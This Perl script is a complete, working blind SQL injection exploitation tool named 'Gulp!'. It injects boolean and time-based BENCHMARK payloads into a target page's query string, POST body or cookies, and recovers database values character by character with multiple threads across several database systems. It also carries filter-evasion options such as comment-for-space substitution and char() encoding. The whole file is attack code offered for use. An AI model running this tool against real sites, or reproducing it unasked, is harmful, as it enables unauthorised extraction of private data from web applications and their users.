#!/usr/bin/env perl

# Gulp! - Blind SQL Injection general purpose Exploiter
# Hacked together by Stefano Angaran
# PERL >= 5.8 Required

# Tricks
# You can also use LIKE as an alternative to the = operator in string comparison ;-) Or the STRCMP function.

use HTTP::Request::Common;
use LWP::UserAgent;
use POSIX (floor);
use Options;
use CGI::Enurl;
use URI;
use warnings;
use strict;
#use warnings;
use threads qw(stringify);
#use threads::shared;

# script version
my $version = '1.0';

# global vars

our $verbose;
our $past;
our $req_count=0;
our @results;

# hardcoded parameters
# We assume the chars we are searching are from the ASCII value of 32 to 126

our $hchar = 126; #tilde
our $lchar = 32; #space
our $ua_string = "Mozilla/5.0 (compatible; MSIE 6.01; Windows NT 7.0)";

$|++; #enable autoflush for instant output

$SIG{'INT'} = 'INT_handler'; #handler for SIGINT Signal

sub kill_handler{
    $SIG{'KILL'} = \&kill_handler;
    print "Killed ".threads->tid()."\n" if $verbose;
    threads->exit();
}

$SIG{'KILL'} = \&kill_handler;


########################################
#                MAIN                  #
########################################

print qq{
#############################################
#                  Gulp!                    #
#        a script from Stefano Angaran      #
#############################################
Version $version

};

my $options = new Options(
    params => [
        ['path', 'p', undef, 'The path of the vulnerable page.'],
        ['query', 'q', '', 'The query string ( or request content if POST )'],
        ['type', 't', 'GET', 'The request type'],
        ['parameter', 'r', undef, 'The researched parameter'],
        ['good-guy', 'g', '', 'Pick a word from the correct response, can be a regex. Needed if -k is not enabled'],
        ['start','s', 1, 'Set the position of the first char to retrieve'],
        ['proxy', 'x', '', 'Proxy server in the http:/domain:port format'],
        ['dbms', 'd', 'mysql', 'The target DBMS'],
        ['cookie', 'c', '', 'Cookie content'],
		['bench-num', 'n', 300000, 'Number of times to execute the MD5 function in BENCHMARK ( only applicable when using time-based SQL Injection, the -k flag must be enabled )'],
		['iterator-start', 'i', 1, 'First row to grab'],
		['iterator-end', 'e', 1, 'Last row to grab. Must be greater than iterator-start'],
		['output', 'o', '', 'Output file'],
        ['threads', 'T', 4, 'Number of threads'],
    ],
    flags =>  [
        ['reverse-behaviour','b', 'Considers TRUE the case when the chosen world DOES NOT appear in the response'],
        ['ignore-case', 'i', 'Ignore case in the extracted strings to reduce characters range'],
        ['help', 'h', 'Print a help message'],
        ['verbose', 'v', 'Print every uri requested during the process'],
		['time-based', 'k', 'Use time-based Blind SQL Injection'],
		['comment-spaces','m','Replace every space with /**/ MySQL multiline comment'],
    ]
);


our %opts = $options->get_options(); # This die if specified arguments are not given by user

# Getting command line parameters
our ($path, $query, $parameter, $good_guy, $type, $proxy, $dbms, $start, $ic, $cookie, $inj_point, $reverse, $qstart, $qend, $numbench, $mtrue, $mfalse, $it_start, $it_end, $threads_num);
$verbose = $opts{'verbose'}; # should I be verbose?
$path = $opts{'path'};
$ic = $opts{'ignore-case'};
$query = $opts{'query'};
$parameter = "(".$opts{'parameter'}.")";
$good_guy = $opts{'good-guy'};
$type = uc($opts{'type'});
$proxy = $opts{'proxy'};
$dbms = lc($opts{'dbms'});
$start = int($opts{'start'});
$cookie = $opts{'cookie'};
$reverse = $opts{'reverse-behaviour'};
$numbench = int($opts{'bench-num'});
$threads_num = int($opts{'threads'});
$it_start = $opts{'iterator-start'} eq 'zero' ? 0 : int($opts{'iterator-start'}); # small hack..
$it_end = int($opts{'iterator-end'});

# dealing with output file
if($opts{'output'}){
	open OUT, ">>$opts{'output'}" or die "Could not open the specified file $opts{'output'}\n";
}

# dealing with multiple iterations
die "Iterator end must be greater than iterator start!\n" if $it_end <= $it_start and $it_start != 1;
my $iterative = ($it_start != $it_end) ? 1 : 0; # iteration requested?

# basic checks
die "You must specify an iterator placeholder with <{i}> in your request data!\n" if $query !~ /<{i}>/ and $parameter !~ /<{i}>/ and $cookie !~ /<{i}>/ and $iterative;
print_help_message() if ($opts{'help'} or ($type ne 'POST' and $type ne 'GET')) or (!$opts{'time-based'} and $good_guy eq '');
print_help_message() unless ($cookie =~ /<{SQLi}>/ xor $query =~ /<{SQLi}>/);

$inj_point = ($query =~ /<{SQLi}>/) ? 1 : 0; # deciding where to inject the SQL string ( 1 = query string, 0 = cookies )

# Creating UserAgent object
my $ua = LWP::UserAgent->new;
$ua->agent($ua_string); # The User Agent string
$ua->proxy('http', $proxy) if $proxy;

# Variables

my $higher = 0;
my $equal = 0;
my ($index, $mid, $injection, $content, $found, $high, $low);
$index = (defined $start and $start > 1)? $start : 1;
my $value = '';
our $temp_query = ($inj_point) ? $query : $cookie;
our $function = ($dbms eq 'mysql') ? 'SUBSTRING' : ($dbms eq 'access' ? 'MID' : 'SUBSTR'); # support for Oracle SUBSTR function and access MID function
our $fun_ascii = ($dbms eq 'access') ? 'ASC' : 'ASCII'; # support for Microsoft Access ASC function

print "Number of threads: $threads_num\n";
print "Selected DBMS: $dbms\n\n";

$past = time();

# if the type of the injection is time based we make a couple of tests to calculate the mean time of a TRUE and FALSE response
# Please note that using a proxy could require an increment of the number of iterations for BENCHMARK to get accurate results
if($opts{'time-based'}){
    # you can play with these parameters to finetouch your exploitation
    my $num_bench_requests = 5;
    my $min_diff = 3; # minimum difference between response time of TRUE and FALSE requests
    die "Sorry, time based SQL injection exploitation not supported for Microsoft Access\n" if ($dbms eq 'access');
    print "Need to do some math to perform time-based SQL Injection.\n";
    print "We now calculate the mean time for a TRUE response.\n";
  
    my ($total_timetrue, $total_timefalse) = (0,0);
    $injection = " AND IF((SELECT 1),BENCHMARK($numbench,MD5(1)),1) ";
    $temp_query =~ s/<{SQLi}>/$injection/;
    for(my $i=0;$i<$num_bench_requests;$i++){
        $qstart = time();
        if($inj_point){
            $content = make_request($ua,$type,$path,$temp_query,$dbms,$cookie); 
        } else {
            $content = make_request($ua,$type,$path,$query,$dbms,$temp_query);
        }
        $qend = time();
        $total_timetrue += ($qend - $qstart);
        print ''.($qend-$qstart)." s\n";
    }
  
    print "We now calculate the mean time for a FALSE response.\n";
  
    $temp_query = ($inj_point) ? $query : $cookie;
    $injection = " AND IF((SELECT 0),BENCHMARK($numbench,MD5(1)),1) ";
    $temp_query =~ s/<{SQLi}>/$injection/;
    for(my $i=0;$i<$num_bench_requests;$i++){  
        $qstart = time();
        if($inj_point){
            $content = make_request($ua,$type,$path,$temp_query,$dbms,$cookie);
        } else {
            $content = make_request($ua,$type,$path,$query,$dbms,$temp_query);
        }
        $qend = time();
        $total_timefalse += ($qend - $qstart);
        print ''.($qend-$qstart)." s\n";
    }
  
    # we do the math
    $mtrue = $total_timetrue / $num_bench_requests;
    $mfalse = $total_timefalse / $num_bench_requests;
  
    print "The mean time for a TRUE response is $mtrue.\n";
    print "The mean time for a FALSE response is $mfalse.\n";
  
    if (abs($mtrue - $mfalse)<$min_diff){
        print "The two values are too close to return accurate values. Please try to increment the number of iterations for the BENCHMARK function using the -n option.\n";
        print "Program will now terminate\n";
        exit 1;
    } else {
        print "Values are good enough, now we will start the injection process.\n\n";
        $temp_query = ($inj_point) ? $query : $cookie;
    }
}

print "Retrieving value(s):\n\n";

while($it_start <= $it_end){ # multiple records loop

    # starting threads to get multiple characters at the same time
    
    my (@threads,@given_indexes);
    my @current_value; # here we are going to save the current record while we get it
    $current_value[0] = '';
    my $current_found = 0;
    my $current_string = '';
    my $max_index;
    $max_index = -1; # using a negative value as infinity
    
    for(1..$threads_num){
        my $thr = threads->create('worker',$index);
        if(not defined $thr){
            print "There was a problem creating a thread. Exiting..\n";
            exit 1;
        }
        push @threads, $thr;
        push @given_indexes, $index++;
    }
    
    $index--;
    
    my $active_th = $threads_num;
    
    while(($current_found<$max_index or $max_index == -1) and $active_th){
        for(my $i=0;$i<$threads_num;$i++){
            # let the main thread sleep if waiting for just the last character
            sleep 1 if ($active_th == 1 and $current_found == $max_index - 1);
            
            # we don't want a blocking join..
            next if $threads[$i]->is_running() or !$threads[$i]->is_joinable();
            $active_th--;
            my $ret = $threads[$i]->join();
            if(not defined $ret or $ret eq ''){
                # got no results from this thread, the string is probably smaller thant the assigned index
                my $the_index = $given_indexes[$i];
                if($max_index < 0 or $max_index >= $the_index){
                    $max_index = $the_index - 1;
                }
                # now we are going to terminate all the threads that are searching for indexes larger than $max_index
                for(my $j=0;$j<$threads_num;$j++){
                    if($given_indexes[$j] > $max_index and $threads[$j]->is_running and $j!=$i){
                        $threads[$j]->kill('KILL');
						$threads[$j]->join;
						$active_th--;
                    }
                }
            } else {
                # character found
                my $the_index = $given_indexes[$i];
                $current_found++;
                $current_value[$the_index] = $ret;
                my $thr = threads->create('worker',++$index);
                $active_th++;
                $given_indexes[$i] = $index;
                $threads[$i] = $thr;
                
                # printing the string
                if($the_index == length($current_string) + $start){ # if the determined character is the next on the currently connected string..
                    for(my $z = $the_index; defined $current_value[$z]; $z++){
                        $current_string .= $current_value[$z];
                        print $current_value[$z] if !$verbose;
                    }
                    print "Result so far: $current_string\n" if $verbose;
                }
            }
        }
    }
    
    if($active_th){
        # killing active threads if any
        for (@threads){
            ($_->join) if ($_->is_running or $_->is_joinable);
        }
    }
    
	if($start != 1){
		@current_value = splice @current_value, $start;
	}
    $current_string = join('',@current_value);
    
    last if not length $current_string; # exiting loop
	
	push @results, $current_string;
    print "\n";
	print OUT $current_string."\n" if $opts{'output'};
	$it_start++;
	$index = (defined $start and $start > 1 and $iterative)? $start : 1;
} # end while

if(@results){
    print "\nExploit terminated with success!\n";
    print "Got ".scalar @results." value";
    print "s" if scalar @results > 1;
    print "\n";
    if($verbose){
        print "Final results:\n\n";
        print $_."\n" for (@results);
    }
    print "\nSaved output on $opts{'output'}\n" if $opts{'output'};
} else {
    print "\nSomething went wrong. Please review your query.\n";
}

my $diff = time() - $past;
my $mDiff = int($diff / 60);
my $sDiff = sprintf("%02d", $diff - 60 * $mDiff);
#print "\n\n$req_count total requests.\n";
print "\n\nDone in $mDiff\:$sDiff.\n";

print "\a"; # system bell


########################################
#            SUBROUTINES               #
########################################


# this function convert a string into an equivalent representation, depending on the DBMS
sub convert_to_dbms_char{
    die("String conversion not supported for now with Access\n") if $dbms eq "access"; # temp
    
    my $s = shift;
    my @chars = split //,$s;
    my @ascii;
    for (@chars){
        push @ascii, ord $_;
    }
    if($dbms eq 'mysql'){
        return "char(". join(',',@ascii).")";
    } elsif ($dbms eq 'oracle' or $dbms eq 'postgresql'){
        return "chr(". join(')||(',@ascii).")";
    } elsif ($dbms eq 'mssql'){
        return "char(". join(')+(',@ascii).")";
    }
}

# Return the response content
sub make_request{
    $req_count++;
    my ($ua,$type, $path, $query, $dbms, $cookie) = @_;
    my $req;
    if ($type eq 'POST'){ # POST Request
        #my %values =  split(/[=&]/, $query); # doesn't support empty parameter values
		$query =~  s/ /%20/g;
		$req = HTTP::Request::Common::POST $path, Content => $query;	
    } else { # GET Request
        my $temp_path = $path;
        $temp_path .= "?".$query if ($query ne '');
        # need to parse path to check if it contains a query string
        $req = HTTP::Request->new(GET => $temp_path);
    }
    $req->header('Cookie' => $cookie) if $cookie; # setting Cookie header

    if ($verbose){
        print "\n", $req->as_string;
    }
    my $res = $ua->request($req);
    # Check the outcome of the response
  
    if ($res->is_success) {
        # 200 Response Code
        my $content = $res->content;
        #print $content;   # <--------------------- un-comment for more in-depth debugging
        return $content;
    } elsif($res->is_redirect) {
        # 301/302 Response Code
        my $loc = $res->header("Location");
        if($loc !~ /^http:\/\//){
            my $uri = URI->new($path);
            $loc = "http://".$uri->host.$loc;
            undef $uri;
        }
        my $c = $res->header("Set-Cookie");
        return make_request($ua,'GET',$loc,'',$dbms,$c); # Recursive call
    } elsif($res->code() == 500){
        # 500 Response Code
        print "Error code 500! Retrying request after 5 seconds..\n" if $verbose;
        print $res->content if $verbose;
        return '' if ($res->content =~ /Invalid Procedure Call/i) and $dbms eq 'access'; # necessary to not repeat the request in case of this 'normal' Access error caused by the MID function
        sleep 5; # Sleeping 5 seconds, maybe just a temp problem
        return make_request($ua,$type,$path,$query);
    } else {
        # Error occured..
        print "\n","ERROR with the request..", "\n";
        print $res->status_line, "\n";
        exit 0;
    }
}



sub worker{
    
    my ($char_index) = @_;
    
    my $thr = threads->self;
    
    print "Thread $thr started\n" if $verbose;
    
    my ($mid, $temp_query, $injection,$content,$value);
    my $higher = 0;
    my $equal = 0;
    
    # every worker has its own UserAgent object
    my $ua = LWP::UserAgent->new;
    $ua->agent($ua_string); # The User Agent string
    $ua->proxy('http', $proxy) if  $opts{'proxy'};
    
    my $found = 0; # setting the condition to false
	my $high = $hchar;
	my $low = $lchar;
    
    $temp_query = ($inj_point) ? $query : $cookie;
    
    while(!$found and $low<=$high){ # this loop is going to get a single char
        $higher=0;
        $equal=0;
        $mid = floor(($high + $low) / 2);
        # create request ( using BETWEEN ... AND ... to bypass possible html entities conversion for > or < )
        if(!$opts{'time-based'}){
            $injection = " AND ($fun_ascii($function(".($ic?"UPPER(":"").$parameter.($ic?")":"").",".$char_index.",1))) BETWEEN ".($mid + 1)." AND 400 ";
        } else {
            $injection =  " AND IF($fun_ascii($function(".($ic?"UPPER(":"").$parameter.($ic?")":"").",".$char_index.",1)) BETWEEN ".($mid+1)." AND 400,BENCHMARK($numbench,MD5(1)),1) ";
        }
        $temp_query =~ s/<{SQLi}>/$injection/;
        $temp_query =~ s/<{i}>/$it_start/ if $iterative;
        $temp_query =~ s/<\|(.*?)\|>/convert_to_dbms_char($1)/eg;
        $temp_query =~ s/\s+/\/\*\*\//g if $opts{'comment-spaces'};
        $qstart = time();
        if($inj_point){ # injection in the QUERY_STRING
            $content = make_request($ua,$type,$path,$temp_query,$dbms,$cookie);
        } else { # injection in COOKIES
            $content = make_request($ua,$type,$path,$query,$dbms,$temp_query);
        }
        $qend = time();
        #print "Required time: ".($qend-$qstart)." s\n" if $verbose;
        if((!$opts{'time-based'} and (($content =~ /$good_guy/i) xor $reverse)) or ($opts{'time-based'} and (($qend - $qstart >= $mtrue - 1) xor $reverse))){
            # the condition is TRUE
            $higher = 1;
        } else {
            # performing this check only if needed avoiding unnecessary requests and so limiting overhead and reducing total time
            $temp_query = ($inj_point) ? $query : $cookie;
            if(!$opts{'time-based'}){
                $injection = " AND ($fun_ascii($function(".($ic?"UPPER(":"").$parameter.($ic?")":"").",".$char_index.",1))) BETWEEN ".$mid." AND ".$mid." ";
            } else {
                $injection =  " AND IF($fun_ascii($function(".($ic?"UPPER(":"").$parameter.($ic?")":"").",".$char_index.",1)) BETWEEN ".$mid." AND ".$mid.",BENCHMARK($numbench,MD5(1)),1) ";
            }
            $temp_query =~ s/<{SQLi}>/$injection/;
            $temp_query =~ s/<{i}>/$it_start/ if $iterative;
            $temp_query =~ s/<\|(.*?)\|>/convert_to_dbms_char($1)/e;
            $temp_query =~ s/\s+/\/\*\*\//g if $opts{'comment-spaces'};
            $qstart = time();
            if($inj_point){ # injection in the QUERY_STRING
                $content = make_request($ua,$type,$path,$temp_query,$dbms,$cookie);
            } else { # injection in COOKIES
                $content = make_request($ua,$type,$path,$query,$dbms,$temp_query);
            }
            $qend = time();
            #print "Required time: ".($qend-$qstart)." s\n" if $verbose;
            if((!$opts{'time-based'} and (($content =~ /$good_guy/i) xor $reverse)) or ($opts{'time-based'} and (($qend - $qstart >= $mtrue - 1 ) xor $reverse))){
                # the condition is TRUE
                $equal = 1;
            }
        }
        if($equal){ # if equal I found the letter
            $found = 1;
        } elsif ($higher){
            $mid = 122 if ($ic and $mid >=97 and $mid < 122); # setting mid to 'z' if ignore_case is true and mid is in the lower_case range
            $low = $mid + 1;
        } else { # lower, this also permits to gracefully end the program when the string is terminated
            $mid = 97 if ($ic and $mid > 97 and $mid <= 122); # setting mid to 'a' if ignore_case is true and mid is in the lower case range
            $high = $mid - 1;
        }
        $temp_query = ($inj_point) ? $query : $cookie;
    } # end while
    
    if ($found){
        $value = chr($mid);
        print "\n","Thread $thr found $value as the $char_index character\n" if $verbose;
        return $value;
    } else {
        print "\n","Thread $thr exited with no results. Record length is less than $char_index\n" if $verbose;
        return '';
    }
}

sub INT_handler {
	my $diff = time() - $past;
    my $mDiff = int($diff / 60);
    #print "\n", "Program terminated by user signal after $req_count requests in ".$mDiff.":".sprintf("%02d", $diff - 60 * $mDiff), "\n";
    print "\n", "Program terminated by user signal after ".$mDiff.":".sprintf("%02d", $diff - 60 * $mDiff), "\n";
	print "Got $#results result(s)\n" if @results > 0;
    if($verbose and @results){
        print "Here they are:\n";
        for(@results){
            print $_."\n";
        }
    }
    exit(0);
}

# Print usage message and exit
sub print_help_message{
    print "usage: ./gulp -p path -q query_string -r parameter -g good_guy -t [POST|GET]", "\n";
    print "Execute ./gulp without parameters to obtain additional help","\n";
    print "Use the placeholder <{SQLi}> to specify the injection point in the query_string OR in the cookies", "\n";
    print "good_guy is a portion of the response when the query return TRUE","\n";
    print "\n", "Remember to wrap your parameters with double quotes if they contain ampersands and/or angular parenthesis", "\n";
    exit 0;
}
